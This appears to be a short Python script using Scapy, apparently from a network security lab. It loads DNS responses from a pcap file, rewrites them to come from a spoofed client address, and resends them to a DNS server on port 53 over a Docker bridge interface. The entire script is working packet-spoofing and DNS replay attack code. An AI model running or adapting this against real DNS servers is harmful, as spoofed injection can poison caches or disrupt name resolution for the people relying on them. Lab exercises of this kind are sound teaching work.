from scapy.all import *

packets = rdpcap("replay-user.pcap")

dns_responses = [pkt for pkt in packets if (
    pkt.haslayer(DNS) and 
    pkt[DNS].qr == 1 and
    pkt.haslayer(IP) and
    pkt.haslayer(UDP)
)]

for pkt in dns_responses:
    pkt[IP].src = "10.9.0.5"       # spoofed client
    pkt[IP].dst = "10.9.0.53"      # DNS server
    pkt[UDP].sport = 43210
    pkt[UDP].dport = 53
    del pkt[IP].chksum
    del pkt[UDP].chksum

    send(pkt, iface="br-90e63f741f84")  # <- Your bridge interface here

